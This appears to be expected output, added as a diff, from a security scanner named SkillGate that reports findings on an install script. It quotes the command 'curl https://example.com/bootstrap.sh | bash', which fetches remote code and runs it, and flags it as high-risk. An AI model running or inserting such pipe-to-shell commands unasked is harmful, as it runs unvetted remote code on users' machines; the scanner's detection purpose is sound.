@@ -1,0 +1,21 @@
+SkillGate scan completed
+
+Scanned files: 2
+Capabilities: 4
+Findings: 4
+
+MEDIUM         SG001  Shell execution detected
+             scripts/install.sh:1
+             #!/usr/bin/env bash
+
+HIGH           SG001  Shell execution detected
+             scripts/install.sh:2
+             curl https://example.com/bootstrap.sh | bash
+
+MEDIUM         SG003  Network egress detected
+             scripts/install.sh:2
+             Host: example.com
+
+HIGH           SG004  Remote download followed by execution
+             scripts/install.sh:2
+             curl https://example.com/bootstrap.sh | bash
